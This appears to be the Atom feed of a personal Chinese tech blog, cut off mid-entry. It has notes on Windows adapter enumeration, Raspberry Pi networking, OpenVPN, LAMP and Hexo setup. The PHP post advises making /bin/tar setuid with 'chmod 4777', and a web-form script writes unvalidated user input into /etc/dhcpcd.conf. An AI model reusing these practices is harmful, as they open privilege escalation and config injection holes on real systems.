<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>learn_malware</title>
  
  <subtitle>学习使我快乐，学习使我沉迷</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://scuzhangzhang.github.io/"/>
  <updated>2018-04-12T02:41:16.635Z</updated>
  <id>http://scuzhangzhang.github.io/</id>
  
  <author>
    <name>zwj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>windows 编程获取网卡和ip</title>
    <link href="http://scuzhangzhang.github.io/2018/04/12/windows%E7%BC%96%E7%A8%8B%E8%8E%B7%E5%8F%96%E7%BD%91%E5%8D%A1%E5%92%8CIP/"/>
    <id>http://scuzhangzhang.github.io/2018/04/12/windows编程获取网卡和IP/</id>
    <published>2018-04-11T16:00:00.000Z</published>
    <updated>2018-04-12T02:41:16.635Z</updated>
    
    <content type="html"><![CDATA[<p>一台机器上可能不只有一个网卡，但每一个网卡只有一个MAC地址，而每一个网卡可能配置有多个IP地址；如平常的笔记本电脑中，就会有无线网卡和有线网卡（网线接口）两种；因此，如果要获得本机所有网卡的IP和MAC地址信息，则必须顺序获得每个网卡，再依次获取其信息等；在windows sdk中，用IP_ADAPTER_INFO结构体存储网卡信息，包括网卡名、网卡描述、网卡MAC地址、网卡IP等，该结构体的主要描述如下所示：</p><pre><code>            typedef struct _IP_ADAPTER_INFO {            struct _IP_ADAPTER_INFO* Next;//指向链表中下一个适配器信息的指针            DWORD ComboIndex;//预留值            char AdapterName[MAX_ADAPTER_NAME_LENGTH + 4];//使用ANSI字符串表示的适配器名称            char Description[MAX_ADAPTER_DESCRIPTION_LENGTH + 4];//使用ANSI字符串表示的适配器描述            UINT AddressLength;//适配器硬件地址以字节计算的长度            BYTE Address[MAX_ADAPTER_ADDRESS_LENGTH];//硬件地址以BYTE数组所表示            DWORD Index;//适配器索引                    UINT Type;//适配器类型,主要有以下几种：                    /*                    *   MIB_IF_TYPE_OTHER     1                    *   MIB_IF_TYPE_ETHERNET     6                    *   MIB_IF_TYPE_TOKENRING     9                    *   MIB_IF_TYPE_FDDI     15                    *   MIB_IF_TYPE_PPP     23                    *   MIB_IF_TYPE_LOOPBACK      24                    *   MIB_IF_TYPE_SLIP      28                    */            UINT DhcpEnabled;//指定这个适配器是否开启DHCP            PIP_ADDR_STRING CurrentIpAddress;//预留值            IP_ADDR_STRING IpAddressList;//该适配器的IPv4地址链表            IP_ADDR_STRING GatewayList;//该适配器的网关IPv4地址链表            IP_ADDR_STRING DhcpServer;//该适配器的DHCP服务器的IPv4 地址链表            BOOL HaveWins;            IP_ADDR_STRING PrimaryWinsServer;            IP_ADDR_STRING SecondaryWinsServer;            time_t LeaseObtained;            time_t LeaseExpires;            } IP_ADAPTER_INFO,*PIP_ADAPTER_INFO;由于可能有多个网卡，因此struct _IP_ADAPTER_INFO* Next字段为一个链表结构指针，由于一个网卡可能有多个IP，因此IP_ADDR_STRING字段应该也是一个链表结构，其信息如下所示：    typedef struct _IP_ADDR_STRING    {            struct _IP_ADDR_STRING* Next;  //指向同类型节点，即下一个IP（如果有多IP的话）            IP_ADDRESS_STRING IpAddress;  //IP地址信息            IP_MASK_STRING IpMask; //IP子网掩码            DWORD Context;// 网络表入口。这个值对应着AddIPAddredd和DeleteIPAddress函数中的NTEContext参数    } IP_ADDR_STRING;</code></pre><p>在基本了解以上信息后，就可以调用GetAdaptersInfo函数来获取相关网卡信息了，其通用的代码如下所示：</p><pre><code>#include &lt;WinSock2.h&gt;#include &lt;Iphlpapi.h&gt;#include &lt;iostream&gt;using namespace std;#pragma comment(lib,&quot;Iphlpapi.lib&quot;) //需要添加Iphlpapi.lib库int main(int argc, char* argv[]){        //PIP_ADAPTER_INFO结构体指针存储本机网卡信息        PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();        //得到结构体大小,用于GetAdaptersInfo参数        unsigned long stSize = sizeof(IP_ADAPTER_INFO);        //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量        int nRel = GetAdaptersInfo(pIpAdapterInfo,&amp;stSize);        //记录网卡数量        int netCardNum = 0;        //记录每张网卡上的IP地址数量        int IPnumPerNetCard = 0;        if (ERROR_BUFFER_OVERFLOW == nRel)        {                //如果函数返回的是ERROR_BUFFER_OVERFLOW                //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小                //这也是说明为什么stSize既是一个输入量也是一个输出量                //释放原来的内存空间                delete pIpAdapterInfo;                //重新申请内存空间用来存储所有网卡信息                pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];                //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量                nRel=GetAdaptersInfo(pIpAdapterInfo,&amp;stSize);            }        if (ERROR_SUCCESS == nRel)        {                //输出网卡信息                //可能有多网卡,因此通过循环去判断        while (pIpAdapterInfo)        {                cout&lt;&lt;&quot;网卡数量：&quot;&lt;&lt;++netCardNum&lt;&lt;endl;                cout&lt;&lt;&quot;网卡名称：&quot;&lt;&lt;pIpAdapterInfo-&gt;AdapterName&lt;&lt;endl;                cout&lt;&lt;&quot;网卡描述：&quot;&lt;&lt;pIpAdapterInfo-&gt;Description&lt;&lt;endl;                switch(pIpAdapterInfo-&gt;Type)                {                case MIB_IF_TYPE_OTHER:                        cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;OTHER&quot;&lt;&lt;endl;                        break;                case MIB_IF_TYPE_ETHERNET:                        cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;ETHERNET&quot;&lt;&lt;endl;                        break;                case MIB_IF_TYPE_TOKENRING:                        cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;TOKENRING&quot;&lt;&lt;endl;                        break;                case MIB_IF_TYPE_FDDI:                        cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;FDDI&quot;&lt;&lt;endl;                        break;                case MIB_IF_TYPE_PPP:                        printf(&quot;PP\n&quot;);                        cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;PPP&quot;&lt;&lt;endl;                        break;                case MIB_IF_TYPE_LOOPBACK:                        cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;LOOPBACK&quot;&lt;&lt;endl;                        break;                case MIB_IF_TYPE_SLIP:                        cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;SLIP&quot;&lt;&lt;endl;                        break;                default:break;                }                cout&lt;&lt;&quot;网卡MAC地址：&quot;;                for (DWORD i = 0; i &lt; pIpAdapterInfo-&gt;AddressLength; i++)                        if (i &lt; pIpAdapterInfo-&gt;AddressLength-1)                        {                                printf(&quot;%02X-&quot;, pIpAdapterInfo-&gt;Address[i]);                        }                        else                        {                                printf(&quot;%02X\n&quot;, pIpAdapterInfo-&gt;Address[i]);                        }                        cout&lt;&lt;&quot;网卡IP地址如下：&quot;&lt;&lt;endl;                        //可能网卡有多IP,因此通过循环去判断                        IP_ADDR_STRING *pIpAddrString =&amp;(pIpAdapterInfo-&gt;IpAddressList);                        do                         {                                cout&lt;&lt;&quot;该网卡上的IP数量：&quot;&lt;&lt;++IPnumPerNetCard&lt;&lt;endl;                                cout&lt;&lt;&quot;IP 地址：&quot;&lt;&lt;pIpAddrString-&gt;IpAddress.String&lt;&lt;endl;                                cout&lt;&lt;&quot;子网地址：&quot;&lt;&lt;pIpAddrString-&gt;IpMask.String&lt;&lt;endl;                                cout&lt;&lt;&quot;网关地址：&quot;&lt;&lt;pIpAdapterInfo-&gt;GatewayList.IpAddress.String&lt;&lt;endl;                                pIpAddrString=pIpAddrString-&gt;Next;                        } while (pIpAddrString);                        pIpAdapterInfo = pIpAdapterInfo-&gt;Next;                        cout&lt;&lt;&quot;--------------------------------------------------------------------&quot;&lt;&lt;endl;        }        }        //释放内存空间        if (pIpAdapterInfo)        {                delete pIpAdapterInfo;        }        return 0;}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一台机器上可能不只有一个网卡，但每一个网卡只有一个MAC地址，而每一个网卡可能配置有多个IP地址；如平常的笔记本电脑中，就会有无线网卡和有线网卡（网线接口）两种；因此，如果要获得本机所有网卡的IP和MAC地址信息，则必须顺序获得每个网卡，再依次获取其信息等；在windows
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>linux usb wifi设置AP 模式</title>
    <link href="http://scuzhangzhang.github.io/2017/12/12/ubuntu16.04%E7%B3%BB%E7%BB%9F%E9%80%9A%E8%BF%87usb%20wifi%20%E6%95%A3%E7%83%AD%E7%82%B9/"/>
    <id>http://scuzhangzhang.github.io/2017/12/12/ubuntu16.04系统通过usb wifi 散热点/</id>
    <published>2017-12-11T16:00:00.000Z</published>
    <updated>2017-12-12T02:30:58.048Z</updated>
    
    <content type="html"><![CDATA[<p>一.问题阐述<br>        本文是基于Linux 的ubuntu16.04系统来完成的，usb设备是Realteak 的RTL8188EUS的设备（lsusb看到的），因为ubuntu自带的nl90211无法支持此类设备，所以有两种解决办法。</p><p>二.解决办法</p><pre><code> 第一种方法是编译8188eu的驱动，这个在github上有，而且有很多解决办法，编译前需要安装相应的头文件和编译环境，如何你能这样解决的话，当然是最好了，如果这样没能解决，编译失败又解决不来的话，可以换第二种方法。 第二种方法是编译带8188eu的hostapd来实现，具体实现步骤如下： 1.卸载已有的hostapd sudo apt-get autoremove hostapd 2.下载带有rtl8188eu的源码。 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v2.0.tar.gz tar -zxvf v2.0.tar.gz 3.编译 cd RTL8188-hostapd-2.0/hostapd sudo make 4.安装 sudo  make install此时可能你还是无法创建热点，这是因为ubuntu自带的Nerwork Manager 会对热点的创建产生影响，把无线网卡设置为未托管即可。在/etc/NetworkManager/NetworkManager.conf中添加[keyfile]字段，添加内容为：unmanaged-devices=mac:00:23:cd:10:3e:0b ,mac地址改为自己wifi 设备的地址即可，此时应该就可以创建热点了。参考链接：https://jenssegers.com/43/Realtek-RTL8188-based-access-point-on-Raspberry-Pihttp://os.51cto.com/art/201311/415573.htm</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一.问题阐述&lt;br&gt;        本文是基于Linux 的ubuntu16.04系统来完成的，usb设备是Realteak 的RTL8188EUS的设备（lsusb看到的），因为ubuntu自带的nl90211无法支持此类设备，所以有两种解决办法。&lt;/p&gt;
&lt;p&gt;二.解决
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>php操作文件</title>
    <link href="http://scuzhangzhang.github.io/2017/12/12/php%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6/"/>
    <id>http://scuzhangzhang.github.io/2017/12/12/php操作文件/</id>
    <published>2017-12-11T16:00:00.000Z</published>
    <updated>2017-12-12T02:36:30.129Z</updated>
    
    <content type="html"><![CDATA[<p>一.问题阐述<br>        php 脚本中实现对文件的修改，压缩。</p><p>二.解决办法</p><pre><code>1.修改文件的权限为777(新手勿喷)  chmod 777 filename2.修改压缩命令的权限 首先找到压缩命令的位置 sudo find / -name tar 发现在/bin/tar 然后赋予权限 chmod 4777 /bin/tar 4777中4代表赋予文件所有者的权限 此时就可以对文件进行修改然后打包了。</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一.问题阐述&lt;br&gt;        php 脚本中实现对文件的修改，压缩。&lt;/p&gt;
&lt;p&gt;二.解决办法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.修改文件的权限为777(新手勿喷)
  chmod 777 filename
2.修改压缩命令的权限
 首先找到压缩命令的位置
 sud
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu16.04 解决apt-get install 安装失败的问题</title>
    <link href="http://scuzhangzhang.github.io/2017/12/05/ubuntu16.04%20%E8%A7%A3%E5%86%B3%E5%AE%89%E8%A3%85%E5%8C%85%E9%97%AE%E9%A2%98/"/>
    <id>http://scuzhangzhang.github.io/2017/12/05/ubuntu16.04 解决安装包问题/</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2017-12-05T09:50:12.657Z</updated>
    
    <content type="html"><![CDATA[<p>1.问题描述：apt-get install 特别慢，几乎不动</p><pre><code>常规的解决办法就是去换源，记得换源之后apt-get update 一般都会得到解决，</code></pre><p>2.由于我的机器当时设置的有翻墙全局代理，所以当我apt-get update 的时候速度非常慢，记得你换源的目的是为了用国内源，增加速度，当你处于全局代理的情况下，从国外访问国内然后再更新，肯定速度会很慢啊，然后无论你换国内的什么源都是一样的。记得关掉。<br>注意:一般翻墙代理都要设置iptables NAT规则，清楚的命令为 iptables -t NAT -F 可以清楚NAT 的规则<br> 对于有些Linux系统，iptables -F不能清除NAT的规则</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.问题描述：apt-get install 特别慢，几乎不动&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;常规的解决办法就是去换源，记得换源之后apt-get update 
一般都会得到解决，
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.由于我的机器当时设置的有翻墙全局代理，所以当我apt-
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>WIN10 linux 子系统安装lamp</title>
    <link href="http://scuzhangzhang.github.io/2017/11/29/win10linux%20%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85LAMP/"/>
    <id>http://scuzhangzhang.github.io/2017/11/29/win10linux 子系统安装LAMP/</id>
    <published>2017-11-28T16:00:00.000Z</published>
    <updated>2017-11-29T14:08:55.197Z</updated>
    
    <content type="html"><![CDATA[<p>1.换源</p><pre><code>备份原先的源cp /etc/apt/sources.list /etc/apt/sources.list.bakvim /etc/apt/sources.list换成deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse更新apt-get update    </code></pre><p>2.安装apache2</p><pre><code>apt-get install apache2service apache2 restart 在本地浏览器打开localhost 应该可以看到apache2的欢迎界面</code></pre><p>3.安装php</p><pre><code>按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子我找的解决办法是如下：apt-get install software-properties-commonadd-apt-repository ppa:ondrej/phpapt-get updateapt-get install phpapt-get install libapache2-mod-phpservice apache2 restart</code></pre><p>4.测试php</p><pre><code>在/var/www/html目录下新建test.php内容如下：&lt;?phpphpinfo();?&gt;打开localhost/test.php 正常显示则代表成功</code></pre><p>5.至于mysql 的安装，后续再写</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.换源&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;备份原先的源
cp /etc/apt/sources.list /etc/apt/sources.list.bak
vim /etc/apt/sources.list
换成
deb http://mirrors.aliyun.com/
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>dns污染的解决</title>
    <link href="http://scuzhangzhang.github.io/2017/11/15/dns%E6%B1%A1%E6%9F%93%E8%A7%A3%E5%86%B3/"/>
    <id>http://scuzhangzhang.github.io/2017/11/15/dns污染解决/</id>
    <published>2017-11-14T16:00:00.000Z</published>
    <updated>2017-11-22T11:19:58.450Z</updated>
    
    <content type="html"><![CDATA[<p>dnsmasq+chinadns+hev-dns-forwarder</p><p>1.安装dnsmasq</p><pre><code>sudo apt-get install dnsmasq编辑/etc/dnsmasq.conf 取消no-resolv前面的注释server=127.0.0.1#5354</code></pre><p>2.安装chindns<br>    <a href="https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz" target="_blank" rel="external">https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz</a><br>    解压<br>    tar -zxf chinadns-1.3.2.tar.gz<br>    cd chinadns-1.3.2<br>    ./configure<br>    make<br>    make install<br>    安装结束后在复制到/usr/local/bin 目录中去（可能已经自动复制到了，确认一下）<br>    运行命令为<br>    chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m  &amp; &gt; /dev/null 2&gt;&amp;1</p><p>3.安装</p><pre><code>git clone https://github.com/aa65535/hev-dns-forwardercd hev-dns-forwardermake编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下运行命令hev-dns-forwarder</code></pre><p>4.加入开机启动项</p><pre><code>在/etc/rc.local中加入sudo  hev-dns-forwarder  &amp; &gt; /dev/null 2&gt;&amp;1sudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m  &amp; &gt; /dev/null 2&gt;&amp;1</code></pre><p>参考链接：<br><a href="https://blog.bluerain.io/p/SS-Redir-For-Router.html" target="_blank" rel="external">https://blog.bluerain.io/p/SS-Redir-For-Router.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;dnsmasq+chinadns+hev-dns-forwarder&lt;/p&gt;
&lt;p&gt;1.安装dnsmasq&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install dnsmasq
编辑/etc/dnsmasq.conf 
取消no-resolv前面的注释
s
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>web界面编写</title>
    <link href="http://scuzhangzhang.github.io/2017/11/14/web%E7%95%8C%E9%9D%A2/"/>
    <id>http://scuzhangzhang.github.io/2017/11/14/web界面/</id>
    <published>2017-11-13T16:00:00.000Z</published>
    <updated>2017-11-15T03:56:23.891Z</updated>
    
    <content type="html"><![CDATA[<p>1.为树莓派设置wifi静态ip</p><pre><code>sudo vim /etc/dhcpcd.conf加入interface wlan0inform 192.168.1.1</code></pre><p>2.安装apache2和php</p><pre><code>sudo apt-get install apache2sudo apt-get install php5</code></pre><p>3.apache默认的web目录为/var/www/html</p><pre><code>把你写的html，php,js，css文件放入该目录</code></pre><p>4.我主要是为了登陆树莓派设置一个静态IP，代码如下<br>    setip.html</p><pre><code>&lt;!DOCTYPE html&gt;  &lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;      &lt;meta charset=&quot;UTF-8&quot;&gt;      &lt;title&gt;设置页面&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;config.css&quot;/&gt;   &lt;/head&gt;  &lt;body&gt;&lt;div id=&quot;config_frame&quot;&gt;      &lt;p style=&quot;color:#0C5391;&quot; id=&quot;image_logo&quot;&gt;设置ip&lt;/p&gt;     &lt;form action=&quot;setip.php&quot; method=&quot;get&quot; id=&quot;form_control&quot; enctype=&quot;multi-part/form-data&quot;&gt;          &lt;div id=&quot;login_control&quot; style=&quot;text-align: center;&quot; &gt;              &lt;input  name=&quot;ip&quot; type=&quot;text&quot; id=&quot;ip&quot;  class=&quot;text_field&quot; &gt;        &lt;/div&gt;        &lt;br&gt;        &lt;br&gt;        &lt;br&gt;        &lt;div style=&quot;text-align: center;&quot; &gt;                 &lt;input type=&quot;submit&quot;&gt;        &lt;/div&gt;         &lt;div style=&quot;text-align: center;&quot; &gt;                     &lt;p  &gt;&lt;label id=&quot;log&quot; class=&quot;label&quot;&gt;&lt;/label&gt;&lt;/p&gt;         &lt;/div&gt;     &lt;/form&gt;  &lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;setip.php&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;); error_reporting(E_ALL | E_STRICT);$arr = file(&quot;/etc/dhcpcd.conf&quot;);//echo $arr[count($arr)-1];$ip = $_GET[&apos;ip&apos;];//echo (&quot;inform&quot;.&quot;  &quot;.$ip);$data=&quot;inform&quot;.&quot;  &quot;.$ip;$arr[count($arr)-1]=$data;//echo $arr[count($arr)-1];file_put_contents(&apos;/etc/dhcpcd.conf&apos;, $arr);?&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;      &lt;meta charset=&quot;UTF-8&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;config.css&quot;/&gt;   &lt;/head&gt;  &lt;body&gt;&lt;script&gt;alert(&quot;设置成功，请重启&quot;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.为树莓派设置wifi静态ip&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/dhcpcd.conf
加入
interface wlan0
inform 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.安装apache2和php&lt;/p&gt;
&lt;pre&gt;
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>树莓派搭建vpn服务器</title>
    <link href="http://scuzhangzhang.github.io/2017/11/11/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://scuzhangzhang.github.io/2017/11/11/树莓派搭建vpn服务器/</id>
    <published>2017-11-10T16:00:00.000Z</published>
    <updated>2017-11-29T14:05:30.682Z</updated>
    
    <content type="html"><![CDATA[<p>1.此篇是在前篇搭建树莓派透明网管的基础上完成的，有兴趣的可以去看看</p><pre><code>[树莓派透明代理](http://scuzwj.xyz/2017/10/16/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/)</code></pre><p>2.树莓派尽量设置成静态ip，具体如下</p><pre><code>sudo vim /etc/dhcpcd.conf填写以下内容interface eth0static ip_address=ipstatic routers=网关static domain_name_servers=223.5.5.5</code></pre><p>3.安装openvpn</p><pre><code>sudo apt-get install openvpn</code></pre><p>4.下载easy-rsa</p><pre><code>cd /etc/openvpnwget --no-check-certificate https://github.com/OpenVPN/easy-rsa/releases/download/2.2.2/EasyRSA-2.2.2.tgztar -xzvf EasyRSA-2.2.2.tgzmv EasyRSA-2.2.2 easy-rsa</code></pre><p>5.配置easy-rsa</p><pre><code>cd /etc/openvpn/easy-rsavim vars    # 打开easy-rsa配置文件修改一下内容export EASY_RSA=&quot;/etc/openvpn/easy-rsa&quot;export KEY_SIZE=1024 #默认的2048太大，要运算很久加载配置source ./vars</code></pre><p>6.生成ca密钥</p><pre><code>./clean-all      # 先清空所有密钥./build-ca       # 创建自己的证书所有内容直接回车就可以了。这时keys文件夹下会多了ca.crt,和ca.key文件</code></pre><p>7.生成服务器密钥</p><pre><code>./build-key-server servername # servername为你自己设置的服务器名字会出现很多让填写的地方，注意下面三个其他的默认就好Common Name 常用名必须是你方才所设置的服务器名，默认设置如此。A challenge password? 网上说必须留空，我也照办了，不晓得为什么Sign the certificate? [y/n] 必须填y</code></pre><p>8.生成客户端密钥</p><pre><code>./build-key-pass client1   # 命令中client1是客户端的名字Enter PEM pass phrase 这个要记住，这是客户端使用vpn时的密码，会让输入两次。这时keys下又会多出三个文件client1.csr client1.crt client.key</code></pre><p>9.生成dh</p><pre><code>./build-dh到此密钥生成部分就完成了。</code></pre><p>10.openvpn 服务器配置    </p><pre><code># 复制一个模板过来先cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/server.confvim /etc/openvpn/server.conf下面是我的配置port 1194   #Openvpn服务使用的端口proto tcp   #使用udp协议传输dev tun     #使用隧道ca /etc/openvpn/easy-rsa/keys/ca.crt        #ca公钥路径cert /etc/openvpn/easy-rsa/keys/server.crt  #服务器公钥路径key /etc/openvpn/easy-rsa/keys/server.key   #服务器私钥路径dh /etc/openvpn/easy-rsa/keys/dh1024.pem    #dhserver 10.10.20.0 255.255.255.0   #客户端连接后，所在的子网段ifconfig-pool-persist ipp.txt   #客户端使用固定的子网地址，这里可以不配置push &quot;redirect-gateway def1 bypass-dhcp&quot;    #网关重定向，客户端的流量都会经由OpenvpnServer#配置DNSpush &quot;dhcp-option DNS 202.141.162.123&quot;push &quot;dhcp-option DNS 202.38.93.153 client-to-clientduplicate-cn    #允许客户端的CommonName重复，因为我们填的都是默认值keepalive 10 120comp-lzo    #启动数据压缩user nobody     #Openvpn进程运行时所属的用户，这里为了安全group nogroup   #Openvpn进程运行时所属的组，这里为了安全persist-key     #一直保存key，避免权限问题导致不能再次读取persist-tun     #一直保持隧道，原因同上status /etc/openvpn/easy-rsa/keys/openvpn-status.log   #Openvpn运行状态Log，就在Openvpn目录下，会自动生成log openvpn.log             #Openvpn运行Log，也在Openvpn目录下，会自动生成verb 3                      #log的等级</code></pre><p>11.此时可以测试一下了</p><pre><code>openvpn server.confservice openvpn restart不报错就是成功了</code></pre><p>12.客户端配置</p><pre><code>cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/clientconfig/client.confvim /etc/openvpn/clientconfig/client.conf我的配置如下：# 里面注释也很详细，这里贴出我精简后的结果client      #标明是客户端配置dev tun     #使用隧道proto tcp   #使用UDPremote 192.168.19.149 1194   #树莓派外网IP（使用动态域名绑定） + 端口comp-lzo        ca ca.crt       #ca公钥cert wxlnb.crt  #客户端公钥key wxlnb.key   #客户端私钥verb 3  #log等级</code></pre><p>13.防火墙规则我就改了一点</p><pre><code>iptables -t nat -A PREROUTING -i tun0 -p tcp -j REDSOCKS</code></pre><p>14.测试</p><pre><code>在其他Windows机器上，下载openvpn 安装，然后把ca.crt,client.conf（就是刚刚那个client.conf）,client1.crt,client1.key复制到config 文件夹下。</code></pre><p>参考链接</p><pre><code>1.http://www.smartmcu.com/article-246-1.html2.http://blog.csdn.net/wxlguitar/article/details/51175872</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.此篇是在前篇搭建树莓派透明网管的基础上完成的，有兴趣的可以去看看&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[树莓派透明代理](http://scuzwj.xyz/2017/10/16/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>重装系统后hexo 博客恢复</title>
    <link href="http://scuzhangzhang.github.io/2017/11/05/hexo%20%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/"/>
    <id>http://scuzhangzhang.github.io/2017/11/05/hexo 博客恢复/</id>
    <published>2017-11-04T16:00:00.000Z</published>
    <updated>2017-11-05T05:38:26.322Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-安装node-js和git"><a href="#1-安装node-js和git" class="headerlink" title="1.安装node.js和git"></a>1.安装node.js和git</h3><p> 这个不用多说，直接下载安装就行了。</p><h3 id="2-配置-git-个人信息，生成新的-ssh-密钥："><a href="#2-配置-git-个人信息，生成新的-ssh-密钥：" class="headerlink" title="2.配置 git 个人信息，生成新的 ssh 密钥："></a>2.配置 git 个人信息，生成新的 ssh 密钥：</h3><p>git config –global user.name “xxxxxx”<br>git config –global user.email “xxxxxx”<br>ssh-keygen -t rsa -C “xxxxxxxx(邮箱)”</p><h3 id="3-添加公钥"><a href="#3-添加公钥" class="headerlink" title="3.添加公钥"></a>3.添加公钥</h3><p>在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。</p><h3 id="4-安装hexo"><a href="#4-安装hexo" class="headerlink" title="4.安装hexo"></a>4.安装hexo</h3><p>建议先<br>npm install cnpm -g –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="external">https://registry.npm.taobao.org</a><br>安装的时候 用cpm 代替npm<br>这样的话npm 安装比较快而且不容易失败<br>cnpm install hexo-cli -g</p><h3 